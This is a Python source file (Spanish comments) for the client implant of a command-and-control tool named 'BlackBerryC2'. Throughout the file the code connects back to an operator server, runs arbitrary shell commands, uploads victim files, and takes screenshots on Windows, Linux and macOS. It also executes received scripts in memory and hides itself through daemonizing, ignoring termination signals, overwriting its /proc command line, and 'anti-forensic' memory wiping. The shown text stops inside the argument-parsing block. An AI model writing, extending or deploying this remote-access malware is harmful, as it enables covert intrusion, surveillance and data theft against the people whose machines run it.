#!/usr/bin/env python3
# BlackBerry Client TLS

import socket, struct, sys, os, time, threading, getpass, subprocess, hashlib, signal, zlib, ssl, random, argparse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import hmac as hmac_module

# Zstandard para archivos grandes (opcional)
try:
    import zstandard as zstd
    ZSTD_AVAILABLE = True
except ImportError:
    ZSTD_AVAILABLE = False

# ==================== CONFIGURACIÓN ====================
SERVER_HOST = "localhost"
SERVER_PORT = 9948
VERIFY_FINGERPRINT = False
EXPECTED_FINGERPRINT = ""
HMAC_PRE_SHARED_SECRET = b"BlackBerryC2-HMACSecret"

# Contador de secuencia para anti-replay (compatible con servidor b.py)
import threading as _thr
_seq_lock    = _thr.Lock()
_seq_counter = 0

def _next_seq():
    global _seq_counter
    with _seq_lock:
        n = _seq_counter
        _seq_counter = (_seq_counter + 1) & 0xFFFFFFFFFFFFFFFF
        return n
DAEMON_MODE = False

# ==================== CONFIGURACIÓN OPTIMIZADA ====================
ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 9
HEARTBEAT_INTERVAL = 160
RECV_TIMEOUT = 10
AES_KEY_BYTES = 32
MAX_OUTPUT_SIZE = 1024 * 1024 * 100
CHUNK_SIZE = 64 * 1024
PUBKEY_READ_LIMIT = 8192
RECONNECT_DELAY = 30

# ==================== DYNAMIC FILE TRANSFER ====================
FILE_TIMEOUT_BASE = 90
FILE_TIMEOUT_PER_MB = 20
FILE_MAX_TIMEOUT = 7200
FILE_MIN_TIMEOUT = 45
LARGE_FILE_THRESHOLD = 1024 * 1024 * 1024  # 1GB

EXEC_TIMEOUT = 120

def deep_memory_cleanup():
    """Limpieza PROFUNDA de memoria sin dejar rastros."""
    import gc
    import sys
    
    try:
        frame = sys._getframe()
        while frame:
            try:
                if hasattr(frame, 'f_locals'):
                    for var_name in list(frame.f_locals.keys()):
                        try:
                            frame.f_locals[var_name] = None
                        except:
                            pass
                frame = frame.f_back
            except:
                break
        
        globals_to_clean = ['SERVER_HOST', 'SERVER_PORT', 'AES_KEY_BYTES']
        for var in globals_to_clean:
            try:
                if var in globals():
                    globals()[var] = None
            except:
                pass
        
        try:
            for module_name in list(sys.modules.keys()):
                if 'BlackBerry' in module_name or 'crypto' in module_name:
                    try:
                        sys.modules[module_name] = None
                    except:
                        pass
        except:
            pass
        
        for _ in range(5):
            gc.collect(2)
        
        sys.exc_clear() if hasattr(sys, 'exc_clear') else None
        
        return True
    except Exception:
        return False

def zombie_process_cleanup():
    """Limpia procesos zombie y entradas en /proc."""
    try:
        import os
        import signal
        
        try:
            os.waitpid(-1, os.WNOHANG)
        except:
            pass
        
        if sys.platform.startswith('linux'):
            try:
                pid = os.getpid()
                cmdline_path = f'/proc/{pid}/cmdline'
                if os.access(cmdline_path, os.W_OK):
                    try:
                        with open(cmdline_path, 'w') as f:
                            f.write('\x00' * 16)
                    except:
                        pass
            except:
                pass
        
        return True
    except:
        return False

# ==================== MODO SIGILOSO ====================
class SilentMode:
    def write(self, x): pass
    def flush(self): pass

def enable_stealth():
    sys.stdout = SilentMode()
    sys.stderr = SilentMode()
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    try:
        os.chdir("/tmp")
    except:
        pass

def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull, 'r') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdout.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stderr.fileno())

# ==================== FUNCIONES DE PROTOCOLO ====================
def calculate_file_timeout(file_size_bytes):
    """Calcula timeout dinámico basado en tamaño de archivo."""
    size_mb = file_size_bytes / (1024 * 1024)
    timeout = FILE_TIMEOUT_BASE + (size_mb * FILE_TIMEOUT_PER_MB)
    return max(FILE_MIN_TIMEOUT, min(timeout, FILE_MAX_TIMEOUT))

def get_cert_fingerprint(cert_der):
    """Obtiene fingerprint SHA256 del certificado."""
    sha256_hash = hashlib.sha256(cert_der).hexdigest()
    return ':'.join(sha256_hash[i:i+2] for i in range(0, len(sha256_hash), 2))

def get_ecdhe_fingerprint(public_key_pem):
    """Calcula fingerprint SHA256 de la clave pública ECDHE."""
    sha256_hash = hashlib.sha256(public_key_pem).hexdigest()
    return ':'.join(sha256_hash[i:i+2] for i in range(0, len(sha256_hash), 2))

def verify_server_cert(sock):
    """Verifica el fingerprint del certificado del servidor."""
    if not VERIFY_FINGERPRINT:
        return True
    
    try:
        cert_der = sock.getpeercert(binary_form=True)
        if not cert_der:
            return False
        
        fingerprint = get_cert_fingerprint(cert_der)
        return fingerprint.lower() == EXPECTED_FINGERPRINT.lower()
    except:
        return False

def recvall(sock, n, timeout=30):
    data = b''
    end_time = time.time() + timeout
    while len(data) < n:
        time_left = end_time - time.time()
        if time_left <= 0:
            return None
        sock.settimeout(time_left)
        try:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        except:
            return None
    return data

def send_encrypted_message(sock, plaintext, aes_key, timeout=30):
    """Wire: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC]  — compatible b.py"""
    try:
        pb = plaintext.encode('utf-8', 'replace') if isinstance(plaintext, str) else plaintext
        flag, payload = 0, pb
        if ENABLE_COMPRESSION and len(pb) > 100:
            try:
                c2 = zlib.compress(pb, level=COMPRESSION_LEVEL)
                if len(c2) < len(pb): payload, flag = c2, 1
            except: pass
        aesgcm = AESGCM(aes_key)
        nonce  = os.urandom(12)
        cipher = aesgcm.encrypt(nonce, payload, None)
        seq    = struct.pack('!Q', _next_seq())
        htag   = hmac_module.new(aes_key, seq + nonce + cipher, hashlib.sha256).digest()
        msg    = seq + bytes([flag]) + nonce + cipher + htag
        pkt    = struct.pack('!I', len(msg)) + msg
        sock.settimeout(timeout)
        sock.sendall(pkt)
        return True
    except: return False

def receive_encrypted_message(sock, aes_key, timeout=RECV_TIMEOUT):
    """Wire: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC]  — compatible b.py"""
    try:
        raw_len = recvall(sock, 4, timeout)
        if not raw_len: return None, None
        msg_len = struct.unpack('!I', raw_len)[0]
        if msg_len > MAX_OUTPUT_SIZE: return None, None
        data = recvall(sock, msg_len, timeout=max(15, msg_len / 10000))
        if not data or len(data) < 53: return None, None   # 8+1+12+0+32 mín
        seq   = data[0:8]
        flag  = data[8]
        nonce = data[9:21]
        htag  = data[-32:]
        ciph  = data[21:-32]
        if not hmac_module.compare_digest(
            htag, hmac_module.new(aes_key, seq+nonce+ciph, hashlib.sha256).digest()):
            return None, None
        pb = AESGCM(aes_key).decrypt(nonce, ciph, None)
        if flag == 1: pb = zlib.decompress(pb)
        elif flag == 2:
            if ZSTD_AVAILABLE: pb = zstd.ZstdDecompressor().decompress(pb)
            else: return None, None
        return pb, pb.decode('utf-8', 'replace')
    except: return None, None

def send_file_to_server(sock, aes_key, file_path):
    try:
        if not os.path.isfile(file_path):
            send_encrypted_message(sock, f"[ERROR] Archivo no encontrado: {file_path}", aes_key)
            return
        
        file_size = os.path.getsize(file_path)
        timeout = calculate_file_timeout(file_size)
        
        # Decidir compresión
        use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
        if use_zstd:
            cctx = zstd.ZstdCompressor(level=3)
        
        sha = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()
        
        header = f"SIZE {file_size} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key, timeout=timeout):
            return
        
        with open(file_path, 'rb') as f:
            while chunk := f.read(CHUNK_SIZE):
                flag = 0
                payload_chunk = chunk
                
                if use_zstd:
                    try:
                        comp = cctx.compress(chunk)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 2
                    except:
                        pass
                elif ENABLE_COMPRESSION:
                    try:
                        comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 1
                    except:
                        pass
                
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, payload_chunk, None)
                packet = bytes([flag]) + nonce + ct
                full_packet = struct.pack('!I', len(packet)) + packet
                
                sock.settimeout(timeout)
                sock.sendall(full_packet)
    except:
        pass

def execute_in_memory_robust(file_bytes, file_name="<received>"):
    """
    Ejecución FILELESS anti-forense en memoria.
    - Ejecuta en el mismo proceso (Python)
    - Borra todo rastro de memoria después
    - Sin archivos temporales
    - Soporte multi-lenguaje interpretado
    """
    import gc
    
    ext = os.path.splitext(file_name)[1].lower()
    
    # Interpretes soportados (solo lenguajes NO compilables)
    interpreters = {
        ".py": ("python", ["python3", "-c"]),
        ".py2": ("python2", ["python2", "-c"]),
        ".sh": ("bash", ["bash", "-c"]),
        ".bash": ("bash", ["bash", "-c"]),
        ".pl": ("perl", ["perl", "-e"]),
        ".rb": ("ruby", ["ruby", "-e"]),
        ".php": ("php", ["php", "-r"]),
        ".js": ("node", ["node", "-e"]),
        ".lua": ("lua", ["lua", "-e"]),
        ".awk": ("awk", ["awk"]),
        ".r": ("r", ["Rscript", "-e"]),
        ".R": ("r", ["Rscript", "-e"]),
        ".ps1": ("powershell", ["pwsh", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"]),
        ".zsh": ("zsh", ["zsh", "-c"]),
        ".fish": ("fish", ["fish", "-c"]),
        ".ksh": ("ksh", ["ksh", "-c"]),
        ".csh": ("csh", ["csh", "-c"]),
        ".tcsh": ("tcsh", ["tcsh", "-c"]),
    }
    
    lang_type, interpreter_cmd = interpreters.get(ext, ("bash", ["bash", "-c"]))
    
    try:
        # Decodificar código
        code_str = file_bytes.decode('utf-8', errors='replace')
        
        # ========== EJECUCIÓN PYTHON EN EL MISMO PROCESO (FILELESS TOTAL) ==========
        if lang_type in ("python", "python2"):
            try:
                # Crear namespace temporal aislado
                temp_namespace = {
                    '__builtins__': __builtins__,
                    '__name__': '__main__',
                    '__file__': '<memory>',
                }
                
                # Capturar stdout/stderr
                from io import StringIO
                import sys
                
                old_stdout = sys.stdout
                old_stderr = sys.stderr
                captured_out = StringIO()
                captured_err = StringIO()
                
                try:
                    sys.stdout = captured_out
                    sys.stderr = captured_err
                    
                    # EJECUTAR EN MEMORIA (mismo proceso, sin subprocess)
                    exec(compile(code_str, '<memory>', 'exec'), temp_namespace)
                    
                finally:
                    sys.stdout = old_stdout
                    sys.stderr = old_stderr
                
                # Obtener salida
                stdout_data = captured_out.getvalue()
                stderr_data = captured_err.getvalue()
                output = (stdout_data + stderr_data).strip()
                
                # LIMPIEZA ANTI-FORENSE
                # Sobrescribir código en memoria antes de borrar
                code_str = None
                file_bytes = None
                
                # Limpiar namespace temporal
                for key in list(temp_namespace.keys()):
                    temp_namespace[key] = None
                temp_namespace.clear()
                
                # Limpiar capturas
                captured_out.close()
                captured_err.close()
                
                # Forzar recolección de basura
                gc.collect()
                
                if not output:
                    output = "[Ejecutado exitosamente en memoria]"
                
                return True, output
                
            except SyntaxError as e:
                return False, f"[ERROR] Sintaxis Python: {e}"
            except Exception as e:
                return False, f"[ERROR] Ejecución Python: {str(e)}"
        
        # ========== OTROS LENGUAJES: STDIN PIPE (SIN ARCHIVOS TEMP) ==========
        else:
            try:
                # Usar stdin para pasar el código (sin archivos)
                if lang_type == "awk":
                    # AWK necesita el código como argumento
                    proc = subprocess.Popen(
                        ["awk", code_str],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=False
                    )
                else:
                    # La mayoría soporta -c/-e con stdin
                    proc = subprocess.Popen(
                        interpreter_cmd + [code_str],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=False,
                        close_fds=True  # Cerrar file descriptors para no dejar rastro
                    )
                
                # Ejecutar con timeout
                try:
                    stdout_data, stderr_data = proc.communicate(timeout=EXEC_TIMEOUT)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout_data, stderr_data = proc.communicate()
                    
                    # LIMPIEZA
                    code_str = None
                    file_bytes = None
                    gc.collect()
                    
                    return False, f"[TIMEOUT] Ejecución excedió {EXEC_TIMEOUT}s"
                
                # Procesar salida
                stdout_text = stdout_data.decode('utf-8', errors='replace')
                stderr_text = stderr_data.decode('utf-8', errors='replace')
                output = (stdout_text + stderr_text).strip()
                
                # LIMPIEZA ANTI-FORENSE
                code_str = None
                file_bytes = None
                stdout_data = None
                stderr_data = None
                gc.collect()
                
                if not output:
                    output = f"[Ejecutado. Código: {proc.returncode}]"
                
                return True, output
                
            except FileNotFoundError:
                return False, f"[ERROR] Intérprete no encontrado: {interpreter_cmd[0]}"
            except Exception as e:
                # Limpieza en caso de error
                code_str = None
                file_bytes = None
                gc.collect()
                return False, f"[ERROR] Ejecución: {str(e)}"
    
    except Exception as e:
        # Limpieza final en cualquier error
        try:
            code_str = None
            file_bytes = None
            gc.collect()
        except:
            pass
        return False, f"[ERROR] Fallo crítico: {str(e)}"

def handle_incoming_file(header_msg, sock, aes_key):
    try:
        parts = header_msg.split()
        file_size, expected_hash = int(parts[1]), parts[2]
        
        timeout = calculate_file_timeout(file_size)
        
        # Preparar descompresor
        use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
        if use_zstd:
            dctx = zstd.ZstdDecompressor()
        
        file_data = b''
        sha = hashlib.sha256()
        
        while len(file_data) < file_size:
            raw_len = recvall(sock, 4, timeout=timeout)
            if not raw_len:
                return
            
            packet_len = struct.unpack('!I', raw_len)[0]
            packet = recvall(sock, packet_len, timeout=timeout)
            if not packet or len(packet) < 13:
                return
            
            flag = packet[0]
            nonce = packet[1:13]
            ct = packet[13:]
            
            aesgcm = AESGCM(aes_key)
            chunk = aesgcm.decrypt(nonce, ct, None)
            
            if flag == 2:
                if not use_zstd:
                    return
                chunk = dctx.decompress(chunk)
            elif flag == 1:
                chunk = zlib.decompress(chunk)
            
            file_data += chunk
            sha.update(chunk)
        
        if sha.hexdigest() != expected_hash:
            send_encrypted_message(sock, "[ERROR] Fallo de integridad", aes_key)
            return
        
        _, final_command_str = receive_encrypted_message(sock, aes_key, timeout=timeout)
        if not final_command_str or not final_command_str.startswith("PUT_FILE"):
            return
        
        parts = final_command_str.split()
        file_name = parts[1]
        execute = "-exc" in parts
        
        response_msg = ""
        
        if execute:
            success, out = execute_in_memory_robust(file_data, file_name)
            
            if len(out) > MAX_OUTPUT_SIZE:
                out = out[:MAX_OUTPUT_SIZE] + f"\n[... truncado, {len(out)} bytes totales]"
            
            if success:
                response_msg = f"[SUCCESS] '{file_name}' ejecutado:\n{out}"
            else:
                response_msg = f"[ERROR] Fallo: {out}"
        else:
            try:
                save_path = os.path.basename(file_name)
                with open(save_path, "wb") as f:
                    f.write(file_data)
                response_msg = f"[SUCCESS] Archivo '{save_path}' guardado"
            except Exception as e:
                response_msg = f"[ERROR] No se pudo guardar: {e}"
        
        send_encrypted_message(sock, response_msg, aes_key, timeout=EXEC_TIMEOUT)
    except:
        pass

# ==================== CAPTURA DE PANTALLA ====================

def capture_screenshot():
    """
    Captura la pantalla usando métodos nativos del sistema operativo.
    Retorna los bytes de la imagen en formato BMP/PNG sin guardar archivos.
    
    Multiplataforma:
    - Windows: ctypes + GDI32 (nativo)
    - Linux: scrot/imagemagick/xwd/gnome-screenshot
    - macOS: screencapture (nativo)
    
    Returns:
        bytes: Datos de la imagen o None si falla
    """
    system = sys.platform
    
    try:
        if system == 'win32':
            return _capture_screenshot_windows()
        elif system.startswith('linux'):
            return _capture_screenshot_linux()
        elif system == 'darwin':
            return _capture_screenshot_macos()
        else:
            return None
    except Exception:
        return None

def _capture_screenshot_windows():
    """Captura en Windows usando ctypes + GDI32"""
    try:
        import ctypes
        from ctypes import windll, byref, c_int, Structure, POINTER
        from ctypes.wintypes import BYTE, WORD, DWORD, LONG, HANDLE
        
        class BITMAPINFOHEADER(Structure):
            _fields_ = [
                ('biSize', DWORD), ('biWidth', LONG), ('biHeight', LONG),
                ('biPlanes', WORD), ('biBitCount', WORD), ('biCompression', DWORD),
                ('biSizeImage', DWORD), ('biXPelsPerMeter', LONG),
                ('biYPelsPerMeter', LONG), ('biClrUsed', DWORD), ('biClrImportant', DWORD)
            ]
        
        class BITMAPINFO(Structure):
            _fields_ = [('bmiHeader', BITMAPINFOHEADER), ('bmiColors', DWORD * 3)]
        
        user32 = windll.user32
        gdi32 = windll.gdi32
        
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
        gdi32.SelectObject(hdc_mem, hbitmap)
        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
        
        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = screen_width
        bmi.bmiHeader.biHeight = -screen_height
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 24
        bmi.bmiHeader.biCompression = 0
        
        bitmap_size = screen_width * screen_height * 3
        bitmap_data = (BYTE * bitmap_size)()
        gdi32.GetDIBits(hdc_mem, hbitmap, 0, screen_height, bitmap_data, byref(bmi), 0)
        
        gdi32.DeleteObject(hbitmap)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        
        return _create_bmp_from_rgb(bytes(bitmap_data), screen_width, screen_height)
    except Exception:
        return None

def _capture_screenshot_linux():
    """Captura en Linux usando herramientas del sistema"""
    try:
        # Método 1: scrot
        try:
            result = subprocess.run(['scrot', '-o', '/dev/stdout'],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and result.stdout:
                return result.stdout
        except:
            pass
        
        # Método 2: imagemagick
        try:
            result = subprocess.run(['import', '-window', 'root', 'png:-'],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and result.stdout:
                return result.stdout
        except:
            pass
        
        # Método 3: gnome-screenshot
        try:
            tmp_path = '/dev/shm/.tmp_' + hashlib.md5(os.urandom(16)).hexdigest()[:8]
            result = subprocess.run(['gnome-screenshot', '-f', tmp_path],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and os.path.exists(tmp_path):
                with open(tmp_path, 'rb') as f:
                    data = f.read()
                try:
                    os.remove(tmp_path)
                except:
                    pass
                return data
        except:
            pass
        
        # Método 4: xwd + convert
        try:
            xwd_result = subprocess.run(['xwd', '-root', '-silent'],
                                      capture_output=True, timeout=5, check=False)
            if xwd_result.returncode == 0:
                convert_result = subprocess.run(['convert', 'xwd:-', 'png:-'],
                                              input=xwd_result.stdout,
                                              capture_output=True, timeout=5, check=False)
                if convert_result.returncode == 0 and convert_result.stdout:
                    return convert_result.stdout
        except:
            pass
        
        return None
    except Exception:
        return None

def _capture_screenshot_macos():
    """Captura en macOS usando screencapture nativo"""
    try:
        tmp_path = '/tmp/.tmp_' + hashlib.md5(os.urandom(16)).hexdigest()[:8] + '.png'
        result = subprocess.run(['screencapture', '-x', '-t', 'png', tmp_path],
                              capture_output=True, timeout=5, check=False)
        
        if result.returncode == 0 and os.path.exists(tmp_path):
            with open(tmp_path, 'rb') as f:
                data = f.read()
            try:
                os.remove(tmp_path)
            except:
                pass
            return data
        return None
    except Exception:
        return None

def _create_bmp_from_rgb(rgb_data, width, height):
    """Crea un archivo BMP desde datos RGB raw"""
    try:
        row_size = ((width * 3 + 3) // 4) * 4
        pixel_data_size = row_size * height
        file_size = 54 + pixel_data_size
        
        bmp_header = bytearray([
            0x42, 0x4D,  # BM
            *file_size.to_bytes(4, 'little'),
            0, 0, 0, 0,
            54, 0, 0, 0
        ])
        
        info_header = bytearray([
            40, 0, 0, 0,
            *width.to_bytes(4, 'little'),
            *height.to_bytes(4, 'little'),
            1, 0, 24, 0, 0, 0, 0, 0,
            *pixel_data_size.to_bytes(4, 'little'),
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        ])
        
        pixel_data = bytearray()
        row_padding = row_size - (width * 3)
        
        for y in range(height - 1, -1, -1):
            row_start = y * width * 3
            for x in range(width):
                pixel_start = row_start + (x * 3)
                r = rgb_data[pixel_start]
                g = rgb_data[pixel_start + 1]
                b = rgb_data[pixel_start + 2]
                pixel_data.extend([b, g, r])
            pixel_data.extend([0] * row_padding)
        
        return bytes(bmp_header + info_header + pixel_data)
    except Exception:
        return None

# ==================== FIN CAPTURA DE PANTALLA ====================

def process_command_and_respond(cmd, sock, aes_key):
    if not cmd:
        return
    
    output = ""
    
    # Comando para obtener hostname real
    if cmd == "GET_HOSTNAME":
        try:
            output = socket.gethostname()
        except:
            output = "unknown"
    
    # Comando para reportar capacidades de compresión
    elif cmd == "GET_CAPABILITIES":
        caps = ["zlib"]
        if ZSTD_AVAILABLE:
            caps.append("zstd")
        output = "CAPS:" + ",".join(caps)
    
    elif cmd.startswith("FILE_EXISTS "):
        try:
            file_path = cmd.split(maxsplit=1)[1]
            if os.path.isfile(file_path):
                output = f"FILE_EXISTS:YES:{os.path.getsize(file_path)}"
            else:
                output = "FILE_NOT_FOUND"
        except:
            output = "FILE_NOT_FOUND"
    
    elif cmd.startswith("FILE_SIZE "):
        try:
            file_path = cmd.split(maxsplit=1)[1]
            if os.path.isfile(file_path):
                file_size = os.path.getsize(file_path)
                output = f"FILE_SIZE:{file_size}"
            else:
                output = "FILE_SIZE:0"
        except:
            output = "FILE_SIZE:0"
    
    elif cmd.startswith("cd "):
        try:
            target_dir = cmd.split(maxsplit=1)[1]
            os.chdir(target_dir)
            output = f"Directorio cambiado a: {os.getcwd()}"
        except Exception as e:
            output = f"[ERROR] cd: {e}"
    
    elif cmd == "GET_CWD":
        output = os.getcwd()
    
    elif cmd == "whoami":
        output = getpass.getuser()
    
    elif cmd.startswith("GET_FILE "):
        file_path = cmd.split(maxsplit=1)[1]
        send_file_to_server(sock, aes_key, file_path)
        return
    
    elif cmd == "SCREENSHOT" or cmd.startswith("SCREENSHOT"):
        try:
            screenshot_data = capture_screenshot()
            if screenshot_data:
                # Enviar el tamaño primero
                size = len(screenshot_data)
                sha = hashlib.sha256(screenshot_data).hexdigest()
                header = f"SCREENSHOT_SIZE {size} {sha}"
                send_encrypted_message(sock, header, aes_key, timeout=60)
                
                # Enviar la imagen en chunks
                timeout_val = calculate_file_timeout(size)
                offset = 0
                while offset < size:
                    chunk = screenshot_data[offset:offset + CHUNK_SIZE]
                    offset += CHUNK_SIZE
                    
                    flag = 0
                    payload_chunk = chunk
                    
                    if ENABLE_COMPRESSION:
                        try:
                            comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                            if len(comp) < len(chunk):
                                payload_chunk = comp
                                flag = 1
                        except:
                            pass
                    
                    aesgcm = AESGCM(aes_key)
                    nonce = os.urandom(12)
                    ct = aesgcm.encrypt(nonce, payload_chunk, None)
                    packet = bytes([flag]) + nonce + ct
                    full_packet = struct.pack('!I', len(packet)) + packet
                    
                    sock.settimeout(timeout_val)
                    sock.sendall(full_packet)
                
                # Confirmar envío exitoso
                send_encrypted_message(sock, "[SUCCESS] Screenshot capturada y enviada", aes_key)
                return
            else:
                output = "[ERROR] No se pudo capturar la pantalla"
        except Exception as e:
            output = f"[ERROR] Screenshot: {str(e)}"
    
    else:
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=60,
                errors='replace'
            )
            output = (result.stdout + result.stderr).strip()
            if not output:
                output = f"[Comando ejecutado. Código: {result.returncode}]"
        except subprocess.TimeoutExpired:
            output = "[ERROR] Timeout ejecutando comando (60s)"
        except Exception as e:
            output = f"[ERROR] Ejecutando comando: {str(e)}"
    
    send_encrypted_message(sock, output, aes_key)

def heartbeat_sender(sock, aes_key, stop_evt):
    while not stop_evt.is_set():
        if not send_encrypted_message(sock, "HEARTBEAT", aes_key):
            break
        stop_evt.wait(HEARTBEAT_INTERVAL)

def run_client():
    while True:
        raw_sock = None
        tls_sock = None
        stop_evt = threading.Event()
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(15)
            
            if not DAEMON_MODE:
                print(f"[*] Conectando a {SERVER_HOST}:{SERVER_PORT} (TLS)...")
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            tls_sock = context.wrap_socket(raw_sock, server_hostname=SERVER_HOST)
            tls_sock.connect((SERVER_HOST, SERVER_PORT))
            
            if not DAEMON_MODE:
                print("[+] Conexión TLS establecida")
            
            # Verificar fingerprint del certificado si está configurado
            # (esto es adicional a la verificación ECDHE que viene después)
            if not verify_server_cert(tls_sock):
                if not DAEMON_MODE:
                    print("[!] Fingerprint del certificado TLS no coincide")
                raise ValueError("Fingerprint del certificado no coincide")
            
            banner = tls_sock.recv(1024)
            if not DAEMON_MODE:
                print(f"[*] Banner recibido: {banner.decode('utf-8', 'ignore').strip()}")
            
            tls_sock.sendall(b"REQUEST_PUBKEY")
            
            # Recibir clave ECDH pública del servidor
            pem_data = b''
            while b'-----END PUBLIC KEY-----' not in pem_data:
                chunk = tls_sock.recv(PUBKEY_READ_LIMIT)
                if not chunk:
                    raise ValueError("Conexión perdida durante key exchange")
                pem_data += chunk
            
            if not pem_data.startswith(b'ECDH_PUBKEY:'):
                raise ValueError("Respuesta inválida del servidor")
            
            server_ecdh_pub_pem = pem_data[len(b'ECDH_PUBKEY:'):]
            server_ecdh_pub = serialization.load_pem_public_key(server_ecdh_pub_pem)
            
            # Verificar fingerprint ECDHE (independiente del certificado TLS)
            # Esta es la verificación principal que se solicitó
            server_fingerprint_ecdhe = get_ecdhe_fingerprint(server_ecdh_pub_pem)
            if not DAEMON_MODE:
                print(f"[*] Fingerprint servidor ECDHE: {server_fingerprint_ecdhe}")
            
            # Si VERIFY_FINGERPRINT está activado, verificar el fingerprint ECDHE
            # (esto es diferente de verify_server_cert que verifica el certificado TLS)
            if VERIFY_FINGERPRINT and EXPECTED_FINGERPRINT:
                if server_fingerprint_ecdhe.lower() != EXPECTED_FINGERPRINT.lower():
                    if not DAEMON_MODE:
                        print("[!] Fingerprint ECDHE no coincide. Abortando.")
                    raise ValueError("Fingerprint ECDHE no coincide")
                
                if not DAEMON_MODE:
                    print("[+] Fingerprint ECDHE verificado correctamente")
            
            # Generar par ECDH efímero del cliente
            client_ecdh_private = ec.generate_private_key(ec.SECP256R1())
            client_ecdh_public_pem = client_ecdh_private.public_key().public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            if not DAEMON_MODE:
                print("[*] Generando par ECDHE efímero del cliente...")
            
            # Calcular secreto compartido ECDH
            shared_secret = client_ecdh_private.exchange(ec.ECDH(), server_ecdh_pub)
            
            # Derivar clave AES-256 con HKDF
            aes_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'BlackBerryC2_AES_KEY',
            ).derive(shared_secret)
            
            if not DAEMON_MODE:
                print("[*] Secreto compartido calculado via ECDHE")
                print("[*] Clave AES-256 derivada con HKDF")
            
            # Calcular HMAC de autenticación
            hmac_tag = hmac_module.new(
                HMAC_PRE_SHARED_SECRET, shared_secret, hashlib.sha256
            ).digest()
            
            if not DAEMON_MODE:
                print("[*] HMAC de autenticación generado")
            
            # Enviar clave pública ECDH del cliente + HMAC
            tls_sock.sendall(struct.pack('!I', len(client_ecdh_public_pem)) + client_ecdh_public_pem)
            tls_sock.sendall(hmac_tag)
            
            if not DAEMON_MODE:
                print("[+] Autenticación completada exitosamente")
                print("[+] Canal seguro establecido (TLS + AES-256-GCM + Perfect Forward Secrecy)")
                print()
            
            hb_thread = threading.Thread(
                target=heartbeat_sender,
                args=(tls_sock, aes_key, stop_evt),
                daemon=True
            )
            hb_thread.start()
            
            while True:
                _, msg_str = receive_encrypted_message(tls_sock, aes_key, timeout=(HEARTBEAT_INTERVAL + 10))
                if msg_str is None:
                    break
                
                if msg_str.startswith("SIZE "):
                    handle_incoming_file(msg_str, tls_sock, aes_key)
                elif msg_str != "HEARTBEAT_ACK":
                    process_command_and_respond(msg_str, tls_sock, aes_key)
        
        except Exception as e:
            if not DAEMON_MODE:
                print(f"[!] Error: {e}")
        finally:
            if tls_sock:
                tls_sock.close()
            elif raw_sock:
                raw_sock.close()
            stop_evt.set()
            if not DAEMON_MODE:
                print(f"[*] Reconectando en {RECONNECT_DELAY} segundos...")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='BlackBerry Client TLS')
    parser.add_argument('-H', '--host', type=str, default=SERVER_HOST, 
                        help='Host del servidor', dest='host')
    parser.add_argument('-p', '--port', type=int, default=SERVER_PORT, 
                        help='Puerto del servidor')
    parser.add_argument('--hmac', type=str, default='false', 
                        help='Secreto HMAC (false o clave secreta)')
    parser.add_argument('--fingerprint', type=str, default='false', 
                        help='Fingerprint ECDHE esperado (false o fingerprint)')
